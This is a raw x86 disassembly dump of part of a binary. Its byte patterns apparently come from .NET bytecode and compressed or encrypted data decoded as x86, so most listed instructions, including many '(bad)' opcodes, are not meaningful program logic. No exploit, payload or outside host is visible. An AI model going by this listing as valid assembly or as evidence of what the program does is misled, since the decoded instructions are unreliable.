  402b31:	06                   	push   %es
  402b32:	2a 00                	sub    (%eax),%al
  402b34:	1b 30                	sbb    (%eax),%esi
  402b36:	03 00                	add    (%eax),%eax
  402b38:	97                   	xchg   %eax,%edi
  402b39:	00 00                	add    %al,(%eax)
  402b3b:	00 0e                	add    %cl,(%esi)
  402b3d:	00 00                	add    %al,(%eax)
  402b3f:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402b42:	3a 00                	cmp    (%eax),%al
  402b44:	00 0a                	add    %cl,(%edx)
  402b46:	6f                   	outsl  %ds:(%esi),(%dx)
  402b47:	48                   	dec    %eax
  402b48:	00 00                	add    %al,(%eax)
  402b4a:	0a 0a                	or     (%edx),%cl
  402b4c:	04 6f                	add    $0x6f,%al
  402b4e:	3c 00                	cmp    $0x0,%al
  402b50:	00 0a                	add    %cl,(%edx)
  402b52:	2c 29                	sub    $0x29,%al
  402b54:	04 6f                	add    $0x6f,%al
  402b56:	3c 00                	cmp    $0x0,%al
  402b58:	00 0a                	add    %cl,(%edx)
  402b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b5b:	36 00 00             	add    %al,%ss:(%eax)
  402b5e:	0a 28                	or     (%eax),%ch
  402b60:	14 00                	adc    $0x0,%al
  402b62:	00 0a                	add    %cl,(%edx)
  402b64:	2d 17 04 6f 3c       	sub    $0x3c6f0417,%eax
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	0a 6f 36             	or     0x36(%edi),%ch
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	0a 72 b9             	or     -0x47(%edx),%dh
  402b73:	00 00                	add    %al,(%eax)
  402b75:	70 06                	jo     0x402b7d
  402b77:	28 12                	sub    %dl,(%edx)
  402b79:	00 00                	add    %al,(%eax)
  402b7b:	0a 0a                	or     (%edx),%cl
  402b7d:	02 06                	add    (%esi),%al
  402b7f:	28 4b 00             	sub    %cl,0x0(%ebx)
  402b82:	00 06                	add    %al,(%esi)
  402b84:	0c 08                	or     $0x8,%al
  402b86:	2d 04 14 0d de       	sub    $0xde0d1404,%eax
  402b8b:	49                   	dec    %ecx
  402b8c:	08 28                	or     %ch,(%eax)
  402b8e:	4c                   	dec    %esp
  402b8f:	00 00                	add    %al,(%eax)
  402b91:	06                   	push   %es
  402b92:	0b de                	or     %esi,%ebx
  402b94:	0a 08                	or     (%eax),%cl
  402b96:	2c 06                	sub    $0x6,%al
  402b98:	08 6f 45             	or     %ch,0x45(%edi)
  402b9b:	00 00                	add    %al,(%eax)
  402b9d:	0a dc                	or     %ah,%bl
  402b9f:	03 06                	add    (%esi),%eax
  402ba1:	28 4b 00             	sub    %cl,0x0(%ebx)
  402ba4:	00 06                	add    %al,(%esi)
  402ba6:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402ba9:	04 2c                	add    $0x2c,%al
  402bab:	14 11                	adc    $0x11,%al
  402bad:	04 28                	add    $0x28,%al
  402baf:	4c                   	dec    %esp
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	06                   	push   %es
  402bb3:	13 05 07 11 05 28    	adc    0x28051107,%eax
  402bb9:	49                   	dec    %ecx
  402bba:	00 00                	add    %al,(%eax)
  402bbc:	0a 0d de 15 de 0c    	or     0xcde15de,%cl
  402bc2:	11 04 2c             	adc    %eax,(%esp,%ebp,1)
  402bc5:	07                   	pop    %es
  402bc6:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402bc9:	45                   	inc    %ebp
  402bca:	00 00                	add    %al,(%eax)
  402bcc:	0a dc                	or     %ah,%bl
  402bce:	07                   	pop    %es
  402bcf:	28 4a 00             	sub    %cl,0x0(%edx)
  402bd2:	00 0a                	add    %cl,(%edx)
  402bd4:	2a 09                	sub    (%ecx),%cl
  402bd6:	2a 00                	sub    (%eax),%al
  402bd8:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402bdb:	00 02                	add    %al,(%edx)
  402bdd:	00 45 00             	add    %al,0x0(%ebp)
  402be0:	10 55 00             	adc    %dl,0x0(%ebp)
  402be3:	0a 00                	or     (%eax),%al
  402be5:	00 00                	add    %al,(%eax)
  402be7:	00 02                	add    %al,(%edx)
  402be9:	00 68 00             	add    %ch,0x0(%eax)
  402bec:	1a 82 00 0c 00 00    	sbb    0xc00(%edx),%al
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	1b 30                	sbb    (%eax),%esi
  402bf6:	03 00                	add    (%eax),%eax
  402bf8:	b5 00                	mov    $0x0,%ch
  402bfa:	00 00                	add    %al,(%eax)
  402bfc:	0f 00 00             	sldt   (%eax)
  402bff:	11 7e 1d             	adc    %edi,0x1d(%esi)
  402c02:	00 00                	add    %al,(%eax)
  402c04:	04 0c                	add    $0xc,%al
  402c06:	16                   	push   %ss
  402c07:	0d 08 12 03 28       	or     $0x28031208,%eax
  402c0c:	29 00                	sub    %eax,(%eax)
  402c0e:	00 0a                	add    %cl,(%edx)
  402c10:	7e 1e                	jle    0x402c30
  402c12:	00 00                	add    %al,(%eax)
  402c14:	04 03                	add    $0x3,%al
  402c16:	6f                   	outsl  %ds:(%esi),(%dx)
  402c17:	4b                   	dec    %ebx
  402c18:	00 00                	add    %al,(%eax)
  402c1a:	0a 6f 4c             	or     0x4c(%edi),%ch
  402c1d:	00 00                	add    %al,(%eax)
  402c1f:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  402c22:	14 13                	adc    $0x13,%al
  402c24:	04 dd                	add    $0xdd,%al
  402c26:	88 00                	mov    %al,(%eax)
  402c28:	00 00                	add    %al,(%eax)
  402c2a:	de 0a                	fimuls (%edx)
  402c2c:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402c2f:	08 28                	or     %ch,(%eax)
  402c31:	2d 00 00 0a dc       	sub    $0xdc0a0000,%eax
  402c36:	03 6f 4b             	add    0x4b(%edi),%ebp
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	0a 73 4d             	or     0x4d(%ebx),%dh
  402c3e:	00 00                	add    %al,(%eax)
  402c40:	0a 0a                	or     (%edx),%cl
  402c42:	06                   	push   %es
  402c43:	28 48 00             	sub    %cl,0x0(%eax)
  402c46:	00 06                	add    %al,(%esi)
  402c48:	0b 07                	or     (%edi),%eax
  402c4a:	14 28                	adc    $0x28,%al
  402c4c:	4e                   	dec    %esi
  402c4d:	00 00                	add    %al,(%eax)
  402c4f:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402c52:	07                   	pop    %es
  402c53:	2a 7e 1f             	sub    0x1f(%esi),%bh
  402c56:	00 00                	add    %al,(%eax)
  402c58:	04 7e                	add    $0x7e,%al
  402c5a:	20 00                	and    %al,(%eax)
  402c5c:	00 04 06             	add    %al,(%esi,%eax,1)
  402c5f:	28 4d 00             	sub    %cl,0x0(%ebp)
  402c62:	00 06                	add    %al,(%esi)
  402c64:	0b 07                	or     (%edi),%eax
  402c66:	14 28                	adc    $0x28,%al
  402c68:	4f                   	dec    %edi
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	0a 2c 42             	or     (%edx,%eax,2),%ch
  402c6e:	7e 1d                	jle    0x402c8d
  402c70:	00 00                	add    %al,(%eax)
  402c72:	04 0c                	add    $0xc,%al
  402c74:	16                   	push   %ss
  402c75:	0d 08 12 03 28       	or     $0x28031208,%eax
  402c7a:	29 00                	sub    %eax,(%eax)
  402c7c:	00 0a                	add    %cl,(%edx)
  402c7e:	7e 1e                	jle    0x402c9e
  402c80:	00 00                	add    %al,(%eax)
  402c82:	04 03                	add    $0x3,%al
  402c84:	6f                   	outsl  %ds:(%esi),(%dx)
  402c85:	4b                   	dec    %ebx
  402c86:	00 00                	add    %al,(%eax)
  402c88:	0a 17                	or     (%edi),%dl
  402c8a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8b:	50                   	push   %eax
  402c8c:	00 00                	add    %al,(%eax)
  402c8e:	0a de                	or     %dh,%bl
  402c90:	0a 09                	or     (%ecx),%cl
  402c92:	2c 06                	sub    $0x6,%al
  402c94:	08 28                	or     %ch,(%eax)
  402c96:	2d 00 00 0a dc       	sub    $0xdc0a0000,%eax
  402c9b:	06                   	push   %es
  402c9c:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9d:	51                   	push   %ecx
  402c9e:	00 00                	add    %al,(%eax)
  402ca0:	0a 20                	or     (%eax),%ah
  402ca2:	00 01                	add    %al,(%ecx)
  402ca4:	00 00                	add    %al,(%eax)
  402ca6:	5f                   	pop    %edi
  402ca7:	2c 07                	sub    $0x7,%al
  402ca9:	06                   	push   %es
  402caa:	28 52 00             	sub    %dl,0x0(%edx)
  402cad:	00 0a                	add    %cl,(%edx)
  402caf:	0b 07                	or     (%edi),%eax
  402cb1:	2a 11                	sub    (%ecx),%dl
  402cb3:	04 2a                	add    $0x2a,%al
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	00 01                	add    %al,(%ecx)
  402cb9:	1c 00                	sbb    $0x0,%al
  402cbb:	00 02                	add    %al,(%edx)
  402cbd:	00 08                	add    %cl,(%eax)
  402cbf:	00 24 2c             	add    %ah,(%esp,%ebp,1)
  402cc2:	00 0a                	add    %cl,(%edx)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	02 00                	add    (%eax),%al
  402cca:	76 00                	jbe    0x402ccc
  402ccc:	1b 91 00 0a 00 00    	sbb    0xa00(%ecx),%edx
  402cd2:	00 00                	add    %al,(%eax)
  402cd4:	03 30                	add    (%eax),%esi
  402cd6:	03 00                	add    (%eax),%eax
  402cd8:	51                   	push   %ecx
  402cd9:	00 00                	add    %al,(%eax)
  402cdb:	00 00                	add    %al,(%eax)
  402cdd:	00 00                	add    %al,(%eax)
  402cdf:	00 73 1b             	add    %dh,0x1b(%ebx)
  402ce2:	00 00                	add    %al,(%eax)
  402ce4:	0a 80 1d 00 00 04    	or     0x400001d(%eax),%al
  402cea:	73 53                	jae    0x402d3f
  402cec:	00 00                	add    %al,(%eax)
  402cee:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  402cf4:	73 54                	jae    0x402d4a
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  402cfe:	73 54                	jae    0x402d54
  402d00:	00 00                	add    %al,(%eax)
  402d02:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  402d08:	7e 1f                	jle    0x402d29
  402d0a:	00 00                	add    %al,(%eax)
  402d0c:	04 72                	add    $0x72,%al
  402d0e:	bd 00 00 70 72       	mov    $0x72700000,%ebp
  402d13:	cd 00                	int    $0x0
  402d15:	00 70 6f             	add    %dh,0x6f(%eax)
  402d18:	55                   	push   %ebp
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a 7e 1f             	or     0x1f(%esi),%bh
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	04 72                	add    $0x72,%al
  402d22:	0b 01                	or     (%ecx),%eax
  402d24:	00 70 72             	add    %dh,0x72(%eax)
  402d27:	1f                   	pop    %ds
  402d28:	01 00                	add    %eax,(%eax)
  402d2a:	70 6f                	jo     0x402d9b
  402d2c:	55                   	push   %ebp
  402d2d:	00 00                	add    %al,(%eax)
  402d2f:	0a 2a                	or     (%edx),%ch
  402d31:	9a 7f 21 00 00 04 17 	lcall  $0x1704,$0x217f
  402d38:	28 56 00             	sub    %dl,0x0(%esi)
  402d3b:	00 0a                	add    %cl,(%edx)
  402d3d:	17                   	pop    %ss
  402d3e:	33 01                	xor    (%ecx),%eax
  402d40:	2a 28                	sub    (%eax),%ch
  402d42:	37                   	aaa
  402d43:	00 00                	add    %al,(%eax)
  402d45:	0a 14 fe             	or     (%esi,%edi,8),%dl
  402d48:	06                   	push   %es
  402d49:	4e                   	dec    %esi
  402d4a:	00 00                	add    %al,(%eax)
  402d4c:	06                   	push   %es
  402d4d:	73 57                	jae    0x402da6
  402d4f:	00 00                	add    %al,(%eax)
  402d51:	0a 6f 58             	or     0x58(%edi),%ch
  402d54:	00 00                	add    %al,(%eax)
  402d56:	0a 2a                	or     (%edx),%ch
  402d58:	90                   	nop
  402d59:	07                   	pop    %es
  402d5a:	00 00                	add    %al,(%eax)
  402d5c:	ed                   	in     (%dx),%eax
  402d5d:	57                   	push   %edi
  402d5e:	7b 6c                	jnp    0x402dcc
  402d60:	14 c7                	adc    $0xc7,%al
  402d62:	19 ff                	sbb    %edi,%edi
  402d64:	d6                   	salc
  402d65:	67 3b 67 43          	cmp    0x43(%bx),%esp
  402d69:	1c f3                	sbb    $0xf3,%al
  402d6b:	c8 03 68 c9          	enter  $0x6803,$0xc9
  402d6f:	62 07                	bound  %eax,(%edi)
  402d71:	9c                   	pushf
  402d72:	08 b2 77 8e 0d 01    	or     %dh,0x10d8e77(%edx)
  402d78:	d3 04 1b             	roll   %cl,(%ebx,%ebx,1)
  402d7b:	1f                   	pop    %ds
  402d7c:	06                   	push   %es
  402d7d:	b7 e0                	mov    $0xe0,%bh
  402d7f:	d7                   	xlat   %ds:(%ebx)
  402d80:	d9 0e                	(bad) (%esi)
  402d82:	6e                   	outsb  %ds:(%esi),(%dx)
  402d83:	4c                   	dec    %esp
  402d84:	cc                   	int3
  402d85:	de de                	(bad)
  402d87:	f8                   	clc
  402d88:	bc b0 b7 7b dd       	mov    $0xdd7bb7b0,%esp
  402d8d:	dd c3                	ffree  %st(3)
  402d8f:	36 b2 80             	ss mov $0x80,%dl
  402d92:	28 84 12 b5 89 1a b5 	sub    %al,-0x4ae5764b(%edx,%edx,1)
  402d99:	69 40 8a aa 12 11 91 	imul   $0x911112aa,-0x76(%eax),%eax
  402da0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402da1:	49                   	dec    %ecx
  402da2:	4b                   	dec    %ebx
  402da3:	5b                   	pop    %ebx
  402da4:	1a 70 9b             	sbb    -0x65(%eax),%dh
  402da7:	4a                   	dec    %edx
  402da8:	b8 a9 5a 48 20       	mov    $0x20485aa9,%eax
  402dad:	69 9b aa 52 55 54 b9 	imul   $0x102a09b9,0x545552aa(%ebx),%ebx
  402db4:	09 2a 10 
  402db7:	40                   	inc    %eax
  402db8:	8d 9a a0 90 96 42    	lea    0x429690a0(%edx),%ebx
  402dbe:	7f 33                	jg     0x402df3
  402dc0:	bb 77 7e 22 f8       	mov    $0xf8227e77,%ebx
  402dc5:	bb ea 9c f7 37       	mov    $0x37f79cea,%ebx
  402dca:	fb                   	sti
  402dcb:	3d e7 fb be 99       	cmp    $0x99befbe7,%eax
  402dd0:	9d                   	popf
  402dd1:	19 af fb ea b7 28    	sbb    %ebp,0x28b7eafb(%edi)
  402dd7:	40                   	inc    %eax
  402dd8:	44                   	inc    %esp
  402dd9:	b9 78 ae 5d 23       	mov    $0x235dae78,%ecx
  402dde:	3a 42 5e             	cmp    0x5e(%edx),%al
  402de1:	ab                   	stos   %eax,%es:(%edi)
  402de2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402de3:	1b b7 1d 78 8a ee    	sbb    -0x117587e3(%edi),%esi
  402de9:	fe                   	(bad)
  402dea:	79 11                	jns    0x402dfd
  402dec:	1d 2a 38 39 ef       	sbb    $0xef39382a,%eax
  402df1:	88 b4 f6 e4 bc d6 1e 	mov    %dh,0x1ed6bce4(%esi,%esi,8)
  402df8:	dd 91 53 b6 95 b0    	fstl   -0x4f6a49ad(%ecx)
  402dfe:	d5 a4                	aad    $0xa4
  402e00:	ac                   	lods   %ds:(%esi),%al
  402e01:	a9 a6 69 b9 72       	test   $0x72b969a6,%eax
  402e06:	8c c9                	mov    %cs,%ecx
  402e08:	76 da                	jbe    0x402de4
  402e0a:	94                   	xchg   %eax,%esp
  402e0b:	75 53                	jne    0x402e60
  402e0d:	8e 34 46             	mov    (%esi,%eax,2),%?
  402e10:	e5 a4                	in     $0xa4,%eax
  402e12:	15 67 ca ad b7       	adc    $0xb7adca67,%eax
  402e17:	16                   	push   %ss
  402e18:	de e3                	fsubp  %st,%st(3)
  402e1a:	fb                   	sti
  402e1b:	68 5a 45 b4 56       	push   $0x56b4455a
  402e20:	0a d0                	or     %al,%dl
  402e22:	db bf ad 1d cc f8    	fstpt  -0x733e253(%edi)
  402e28:	1d a6 12 79 8a       	sbb    $0x8a7912a6,%eax
  402e2d:	14 26                	adc    $0x26,%al
  402e2f:	0a 82 c8 f7 78 1f    	or     0x1f78f7c8(%edx),%al
  402e35:	94                   	xchg   %eax,%esp
  402e36:	01 e4                	add    %esp,%esp
  402e38:	6c                   	insb   (%dx),%es:(%edi)
  402e39:	60                   	pusha
  402e3a:	c5 e2 3d             	(bad)
  402e3d:	c7                   	(bad)
  402e3e:	8b 9b 68 a4 17 41    	mov    0x4117a468(%ebx),%ebx
  402e44:	81 7f fb 61 42 5e d5 	cmpl   $0xd55e4261,-0x5(%edi)
  402e4b:	4f                   	dec    %edi
  402e4c:	72 55                	jb     0x402ea3
  402e4e:	fe                   	(bad)
  402e4f:	37                   	aaa
  402e50:	d2 67 3b             	shlb   %cl,0x3b(%edi)
  402e53:	d1 9e 86 df 46 3f    	rcrl   $1,0x3f46df86(%esi)
  402e59:	e1 e1                	loope  0x402e3c
  402e5b:	c0 24 49 6e          	shlb   $0x6e,(%ecx,%ecx,2)
  402e5f:	24 9a                	and    $0x9a,%al
  402e61:	8a ee                	mov    %dh,%ch
  402e63:	e8 02 a2 d6 9b       	call   0x9c16d06a
  402e68:	a8 49                	test   $0x49,%al
  402e6a:	b6 c9                	mov    $0xc9,%dh
  402e6c:	5e                   	pop    %esi
  402e6d:	f8                   	clc
  402e6e:	99                   	cltd
  402e6f:	16                   	push   %ss
  402e70:	04 bd                	add    $0xbd,%al
  402e72:	66 14 ad             	data16 adc $0xad,%al
  402e75:	b8 ac cf 45 7f       	mov    $0x7f45cfac,%eax
  402e7a:	f6 16                	notb   (%esi)
  402e7c:	3f                   	aas
  402e7d:	af                   	scas   %es:(%edi),%eax
  402e7e:	a0 17 f7 38 17       	mov    0x1738f717,%al
  402e83:	1b 15 db b1 35 f2    	sbb    0xf235b1db,%edx
  402e89:	63 43 8c             	arpl   %eax,-0x74(%ebx)
  402e8c:	22 d1                	and    %cl,%dl
  402e8e:	c2 b1 7a             	ret    $0x7ab1
  402e91:	60                   	pusha
  402e92:	57                   	push   %edi
  402e93:	2b 36                	sub    (%esi),%esi
  402e95:	33 2c cd 8b 95 c7 2c 	xor    0x2cc7958b(,%ecx,8),%ebp
  402e9c:	7c 15                	jl     0x402eb3
  402e9e:	4d                   	dec    %ebp
  402e9f:	d0 5b 39             	rcrb   $1,0x39(%ebx)
  402ea2:	3e cc                	ds int3
  402ea4:	a1 32 af 5f 23       	mov    0x235faf32,%eax
  402ea9:	4c                   	dec    %esp
  402eaa:	f2 68 3d 06 3d 9b    	repnz push $0x9b3d063d
  402eb0:	47                   	inc    %edi
  402eb1:	54                   	push   %esp
  402eb2:	30 4e af             	xor    %cl,-0x51(%esi)
  402eb5:	7a 81                	jp     0x402e38
  402eb7:	57                   	push   %edi
  402eb8:	da 1b                	ficompl (%ebx)
  402eba:	b5 d9                	mov    $0xd9,%ch
  402ebc:	0e                   	push   %cs
  402ebd:	22 28                	and    (%eax),%ch
  402ebf:	dc 4a 2b             	fmull  0x2b(%edx)
  402ec2:	a3 5f 5e 29 91       	mov    %eax,0x91295e5f
  402ec7:	24 78                	and    $0x78,%al
  402ec9:	3c a6                	cmp    $0xa6,%al
  402ecb:	2d 95 4a 58 a9       	sub    $0xa9584a95,%eax
  402ed0:	08 57 94             	or     %dl,-0x6c(%edi)
  402ed3:	2f                   	das
  402ed4:	e3 9c                	jecxz  0x402e72
  402ed6:	3c 32                	cmp    $0x32,%al
  402ed8:	80 7d 10 97          	cmpb   $0x97,0x10(%ebp)
  402edc:	6e                   	outsb  %ds:(%esi),(%dx)
  402edd:	23 3a                	and    (%edx),%edi
  402edf:	8d be 18 f1 96 46    	lea    0x4696f118(%esi),%edi
  402ee5:	5d                   	pop    %ebp
  402ee6:	5b                   	pop    %ebx
  402ee7:	37                   	aaa
  402ee8:	13 0e                	adc    (%esi),%ecx
  402eea:	d7                   	xlat   %ds:(%ebx)
  402eeb:	f8                   	clc
  402eec:	34 e0                	xor    $0xe0,%al
  402eee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402eef:	5a                   	pop    %edx
  402ef0:	da 16                	ficoml (%esi)
  402ef2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402ef3:	cb                   	lret
  402ef4:	01 6f ce             	add    %ebp,-0x32(%edi)
  402ef7:	4a                   	dec    %edx
  402ef8:	57                   	push   %edi
  402ef9:	b7 d5                	mov    $0xd5,%bh
  402efb:	47                   	inc    %edi
  402efc:	d0 07                	rolb   $1,(%edi)
  402efe:	21 18                	and    %ebx,(%eax)
  402f00:	e6 b6                	out    %al,$0xb6
  402f02:	2b 0d 2b e6 8f 0b    	sub    0xb8fe62b,%ecx
  402f08:	73 69                	jae    0x402f73
  402f0a:	f5                   	cmc
  402f0b:	4c                   	dec    %esp
  402f0c:	3f                   	aas
  402f0d:	ee                   	out    %al,(%dx)
  402f0e:	7f 49                	jg     0x402f59
  402f10:	15 74 07 89 d1       	adc    $0xd1890774,%eax
  402f15:	8b fc                	mov    %esp,%edi
  402f17:	52                   	push   %edx
  402f18:	48                   	dec    %eax
  402f19:	7e 1c                	jle    0x402f37
  402f1b:	53                   	push   %ebx
  402f1c:	fc                   	cld
  402f1d:	77 2f                	ja     0x402f4e
  402f1f:	32 47 f2             	xor    -0xe(%edi),%al
  402f22:	fa                   	cli
  402f23:	7c fa                	jl     0x402f1f
  402f25:	2b 1d 97 f2 29 2c    	sub    0x2c29f297,%ebx
  402f2b:	71 9c                	jno    0x402ec9
  402f2d:	43                   	inc    %ebx
  402f2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f2f:	48                   	dec    %eax
  402f30:	b7 d1                	mov    $0xd1,%bh
  402f32:	39 89 f3 eb a8 03    	cmp    %ecx,0x3a8ebf3(%ecx)
  402f38:	9c                   	pushf
  402f39:	3b a5 5d c0 17 89    	cmp    -0x76e83fa3(%ebp),%esp
  402f3f:	e3 90                	jecxz  0x402ed1
  402f41:	c0 2e 81             	shrb   $0x81,(%esi)
  402f44:	03 02                	add    (%edx),%eax
  402f46:	af                   	scas   %es:(%edi),%eax
  402f47:	0a 0c 09             	or     (%ecx,%ecx,1),%cl
  402f4a:	bc 2c 6d 07 ee       	mov    $0xee076d2c,%esp
  402f4f:	01 52 76             	add    %edx,0x76(%edx)
  402f52:	14 5e                	adc    $0x5e,%al
  402f54:	87 c7                	xchg   %eax,%edi
  402f56:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402f57:	62 ba 06 72 b1 a0    	bound  %edi,-0x5f4e8dfa(%edx)
  402f5d:	9a 64 ce ff 2e 35 48 	lcall  $0x4835,$0x2effce64
  402f64:	47                   	inc    %edi
  402f65:	41                   	inc    %ecx
  402f66:	15 d0 41 c4 31       	adc    $0x31c441d0,%eax
  402f6b:	0d 98 4f b3 80       	or     $0x80b34f98,%eax
  402f70:	85 74 1f b0          	test   %esi,-0x50(%edi,%ebx,1)
  402f74:	98                   	cwtl
  402f75:	ca 05 2e             	lret   $0x2e05
  402f78:	13 58 23             	adc    0x23(%eax),%ebx
  402f7b:	b0 5e                	mov    $0x5e,%al
  402f7d:	60                   	pusha
  402f7e:	b3 c0                	mov    $0xc0,%bl
  402f80:	0e                   	push   %cs
  402f81:	81 aa c0 af 09 5b 05 	subl   $0x1afdd905,0x5b09afc0(%edx)
  402f88:	d9 fd 1a 
  402f8b:	38 83 4e 02 e7 d0    	cmp    %al,-0x2f18fdb2(%ebx)
  402f91:	05 60 29 5d 02       	add    $0x25d2960,%eax
  402f96:	2e a4                	movsb  %cs:(%esi),%es:(%edi)
  402f98:	87 24 85 2a 68 0b 70 	xchg   %esp,0x700b682a(,%eax,4)
  402f9f:	39 3d 01 ac a5 5f    	cmp    %edi,0x5fa5ac01
  402fa5:	00 bf 42 c7 80 51    	add    %bh,0x5180c742(%edi)
  402fab:	7a 1f                	jp     0x402fcc
  402fad:	f8                   	clc
  402fae:	28 30                	sub    %dh,(%eax)
  402fb0:	77 07                	ja     0x402fb9
  402fb2:	af                   	scas   %es:(%edi),%eax
  402fb3:	7a 26                	jp     0x402fdb
  402fb5:	6a a2                	push   $0xffffffa2
  402fb7:	b9 62 a9 65 bf       	mov    $0xbf65a962,%ecx
  402fbc:	2d b4 db 69 fa       	sub    $0xfa69dbb4,%eax
  402fc1:	08 f1                	or     %dh,%cl
  402fc3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402fc4:	75 56                	jne    0x40301c
  402fc6:	3c 6d                	cmp    $0x6d,%al
  402fc8:	b0 87                	mov    $0x87,%al
  402fca:	a9 d6 72 dc b4       	test   $0xb4dc72d6,%eax
  402fcf:	ad                   	lods   %ds:(%esi),%eax
  402fd0:	52                   	push   %edx
  402fd1:	d2 d1                	rcl    %cl,%cl
  402fd3:	2c db                	sub    $0xdb,%al
  402fd5:	d0 63 14             	shlb   $1,0x14(%ebx)
  402fd8:	61                   	popa
  402fd9:	b1 74                	mov    $0x74,%cl
  402fdb:	22 a1 c6 0c 56 e3    	and    -0x1ca9f33a(%ecx),%ah
  402fe1:	62 52 63             	bound  %edx,0x63(%edx)
  402fe4:	69 97 51 8d e3 b0 64 	imul   $0x6fe8cc64,-0x4f1c72af(%edi),%edx
  402feb:	cc e8 6f 
  402fee:	d5 dd                	aad    $0xdd
  402ff0:	d1 ec                	shr    $1,%esp
  402ff2:	56                   	push   %esi
  402ff3:	d5 4e                	aad    $0x4e
  402ff5:	30 b7 0e 3b 06 eb    	xor    %dh,-0x14f9c4f2(%edi)
  402ffb:	b5 ec                	mov    $0xec,%ch
  402ffd:	cd 13                	int    $0x13
  402fff:	f5                   	cmc
  403000:	eb 74                	jmp    0x403076
  403002:	83 b5 33 db d1 2d 73 	xorl   $0x73,0x2dd1db33(%ebp)
  403009:	a2 b0 de ec b6       	mov    %al,0xb6ecdeb0
  40300e:	ec                   	in     (%dx),%al
  40300f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403010:	ea 42 a8 1a d7 d5 aa 	ljmp   $0xaad5,$0xd71aa842
  403017:	b5 cc                	mov    $0xcc,%ch
  403019:	6e                   	outsb  %ds:(%esi),(%dx)
  40301a:	3d 81 08 dd 49       	cmp    $0x49dd0881,%eax
  40301f:	c5 11                	lds    (%ecx),%edx
  403021:	e6 68                	out    %al,$0x68
  403023:	b6 9e                	mov    $0x9e,%dh
  403025:	1a 2b                	sbb    (%ebx),%ch
  403027:	ac                   	lods   %ds:(%esi),%al
  403028:	b5 92                	mov    $0x92,%ch
  40302a:	29 dd                	sub    %ebx,%ebp
  40302c:	10 16                	adc    %dl,(%esi)
  40302e:	2d cc 50 fb c4       	sub    $0xc4fb50cc,%eax
  403033:	9b                   	fwait
  403034:	33 d1                	xor    %ecx,%edx
  403036:	b8 c9 46 11 34       	mov    $0x341146c9,%eax
  40303b:	77 b2                	ja     0x402fef
  40303d:	41                   	inc    %ecx
  40303e:	93                   	xchg   %eax,%ebx
  40303f:	29 d5                	sub    %edx,%ebp
  403041:	ec                   	in     (%dx),%al
  403042:	1f                   	pop    %ds
  403043:	11 b4 a4 4d 57 4f 32 	adc    %esi,0x324f574d(%esp,%eiz,4)
  40304a:	c1 77 f5 98          	shll   $0x98,-0xb(%edi)
  40304e:	6e                   	outsb  %ds:(%esi),(%dx)
  40304f:	e8 ee 28 69 bd       	call   0xbda95942
  403054:	a9 bb ba 6a e8       	test   $0xe86ababb,%eax
  403059:	5b                   	pop    %ebx
  40305a:	19 45 fb             	sbb    %eax,-0x5(%ebp)
  40305d:	1d 97 25 15 5f       	sbb    $0x5f152597,%eax
  403062:	5f                   	pop    %edi
  403063:	f1                   	int1
  403064:	d3 c2                	rol    %cl,%edx
  403066:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403067:	91                   	xchg   %eax,%ecx
  403068:	29 b4 12 37 0c 5f 2b 	sub    %esi,0x2b5f0c37(%edx,%edx,1)
  40306f:	ab                   	stos   %eax,%es:(%edi)
  403070:	cc                   	int3
  403071:	ba 0d a6 f1 18       	mov    $0x18f1a60d,%edx
  403076:	a9 c1 72 eb 93       	test   $0x93eb72c1,%eax
  40307b:	29 83 25 99 e9 b2    	sub    %eax,-0x4d1666db(%ebx)
  403081:	f8                   	clc
  403082:	aa                   	stos   %al,%es:(%edi)
  403083:	3e 8d 89 d4 48 d1 5c 	lea    %ds:0x5cd148d4(%ecx),%ecx
  40308a:	cb                   	lret
  40308b:	ce                   	into
  40308c:	e8 47 74 35 61       	call   0x6175a4d8
  403091:	c2 9b ae             	ret    $0xae9b
  403094:	39 e3                	cmp    %esp,%ebx
  403096:	c7                   	(bad)
  403097:	f3 32 67 76          	repz xor 0x76(%edi),%ah
  40309b:	94                   	xchg   %eax,%esp
  40309c:	d9 5b 74             	fstps  0x74(%ebx)
  40309f:	8d 39                	lea    (%ecx),%edi
  4030a1:	fe                   	(bad)
  4030a2:	6c                   	insb   (%dx),%es:(%edi)
  4030a3:	62 7c cc 37          	bound  %edi,0x37(%esp,%ecx,8)
  4030a7:	c8 c6 d8 26          	enter  $0xd8c6,$0x26
  4030ab:	8c 94 89 a5 cd 15 89 	mov    %ss,-0x76ea325b(%ecx,%ecx,4)
  4030b2:	f8                   	clc
  4030b3:	4b                   	dec    %ebx
  4030b4:	62 c1 f4 25 83       	(bad)
  4030b9:	df c8                	(bad)
  4030bb:	f9                   	stc
  4030bc:	6c                   	insb   (%dx),%es:(%edi)
  4030bd:	f5                   	cmc
  4030be:	9e                   	sahf
  4030bf:	cd b3                	int    $0xb3
  4030c1:	de 69 7b             	fisubrs 0x7b(%ecx)
